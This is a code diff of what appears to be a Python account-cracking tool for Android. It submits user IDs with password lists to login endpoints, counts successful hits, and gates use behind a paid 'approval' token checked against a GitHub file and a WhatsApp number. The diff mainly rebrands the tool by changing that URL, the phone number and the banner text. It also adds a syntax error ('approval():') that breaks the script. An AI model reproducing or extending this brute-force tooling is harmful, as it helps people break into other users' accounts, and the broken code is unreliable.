@@ -60,15 +60,17 @@ logo = ("""\033[1;32m
 \033[1;37m----------------------------------------------""")
 def linex():
         print('\033[1;37m----------------------------------------------')
+
 def clear():
-  os.system('clear')
+        os.system('clear')
+        print(logo)
 def approval():
   os.system('clear')
   print(logo)
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://raw.githubusercontent.com/Hackerrv33/rahulrbc/main/server.txt').text
+    httpCaht = requests.get('https://raw.githubusercontent.com/SXB-BRAND/Premium/main/Approval.txt').text
     if id in httpCaht:
       print("\33[1;32mYour Token is Successfully Approved")
       msg = str(os.geteuid())
@@ -86,11 +88,12 @@ def approval():
       print('\33[1;37m----------------------------------------------')
       print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+9188736899399?text='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923188508994?text='+tks),approval()
       time.sleep(1)
       approval()
   except:
     sys.exit()
+
 
 loop=0
 oks=[]
@@ -144,7 +147,7 @@ def remove_dub():
         print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
 def menu():
         try:
-                approval()
+                approval():
                 clear()
         #       chk()
                 x = ("sex")
@@ -201,7 +204,7 @@ def menu():
                                                 elif mthd in ['2','02']:
                                                         crack_submit.submit(api,ids,names,passlist)
                                                 elif mthd in ['3','03']:
-                                                        crack_submit.submit(file,ids,names,passlist) 
+                                                        crack_submit.submit(ffb3,ids,names,passlist) 
                                                 elif mthd in ['4','04']:
                                                         crack_submit.submit(ffb4,ids,names,passlist)
                                                 elif mthd in ['5','05']:
@@ -281,7 +284,7 @@ xxxxx=("Mozilla/5.0 (Linux; Android 12; Infinix X665E Build/SP1A.210812.016; wv)
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
